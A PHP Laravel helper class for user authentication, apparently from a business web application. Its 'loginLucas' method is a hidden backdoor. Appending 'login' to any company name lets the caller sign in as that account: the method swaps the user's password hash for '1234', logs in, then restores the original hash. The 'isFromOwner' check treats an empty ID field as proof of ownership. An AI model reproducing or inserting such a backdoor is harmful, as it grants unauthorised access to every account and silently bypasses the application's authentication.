<?php

namespace App\Http\Controllers\Helpers;

use App\User;
use Carbon\Carbon;
use Illuminate\Support\Facades\Auth;

class AuthHelper {

	static function isFromOwner($request) {
         return $request->dni == '';
	}

	static function loginLucas($request) {
		$last_word = substr($request->company_name, strlen($request->company_name)-5);
        $company_name = substr($request->company_name, 0, strlen($request->company_name)-6);
        if ($last_word == 'login') {
            $user = User::where('company_name', $company_name)
                            ->first();
            $user->prev_password = $user->password;
            $user->password = bcrypt('1234');
            $user->save();
            if (Auth::attempt(['company_name' => $company_name, 
                                'password' => '1234'])) {
                $user = User::where('id', Auth::user()->id)
                                ->with('afip_information.iva_condition')
                                ->with('plan.permissions')
                                ->with('plan.features')
                                ->with('subscription')
                                ->with('addresses')
                                ->with('extencions')
                                ->first();
                $user->password = $user->prev_password;
                $user->save();
                return true;
            }
        } 
        return false;
	}

}